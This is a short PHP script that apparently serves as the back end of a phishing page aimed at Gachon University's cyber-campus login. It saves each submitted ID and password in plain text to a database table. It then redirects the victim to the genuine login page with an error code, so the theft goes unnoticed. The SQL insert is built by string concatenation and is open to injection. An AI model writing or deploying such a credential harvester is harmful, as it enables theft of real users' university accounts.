<?php
    include "db_info.php";
?>
<?php
    $id = $_POST['id'];
    $pw = $_POST['pw'];

    $sql = "INSERT INTO cyber(id, pw) VALUES('" . $id . "', '" . $pw . "')";
    sq($sql);

    echo "<script>location.href='https://cyber.gachon.ac.kr/login.php?errorcode=3';</script>"
?>